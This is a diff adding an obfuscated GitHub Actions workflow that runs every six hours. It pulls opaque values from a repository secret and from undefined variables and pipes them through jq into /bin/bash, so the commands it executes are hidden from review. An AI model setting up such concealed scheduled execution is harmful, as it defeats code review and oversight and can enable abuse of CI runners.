@@ -1,0 +1,20 @@
+name: sifuzhihouzql
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '28 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: sifuzhihouzql
+        env:
+          j0733: ${{ secrets.j0733 }}
+        run: |
+          echo $j0733 | jq -r .g058 | /bin/bash
+          echo $lo35377 | jq -r .gaqpo6563 | /bin/bash
+          echo $mcz78 | jq -r .z7 | /bin/bash
+
